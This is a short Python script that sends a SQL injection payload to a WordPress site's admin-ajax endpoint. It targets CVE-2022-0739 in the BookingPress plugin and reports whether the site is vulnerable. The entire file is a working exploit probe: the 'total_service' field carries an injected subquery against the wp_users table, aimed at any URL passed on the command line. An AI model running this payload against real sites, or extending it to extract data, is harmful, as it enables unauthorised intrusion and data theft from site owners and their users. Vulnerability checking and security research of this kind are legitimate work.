import requests
import argparse

# This script checks if a target is vulnerable to CVE_2022_0739
# Note: You must provide 2 command line arguments for the TARGET website + valid NONCE


# Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='Target website URL')
parser.add_argument('-n', '--nonce', help='Valid target Nonce')
args = parser.parse_args()

if not args.target:
    print('Please provide a target URL with -t option.')
    exit()


url = args.target +'/wp-admin/admin-ajax.php'

payload = {
    'action': 'bookingpress_front_get_category_services',
    '_wpnonce': args.nonce,
    'category_id': '1',
    'total_service': "1) AND (SELECT TRUE FROM (SELECT user_login FROM wp_users where ID=1)thismeansnothing) -- dummy"
}

response = requests.post(url, data=payload)

# check if response was valid or not
if response.content.decode() == '0' or response.content.decode() == '[]' or 'can not process' in response.content.decode():
    print("Target is NOT vulnerable")

else:
    print("Target IS vulnerable to CVE_2022_0739 " + response.content.decode())
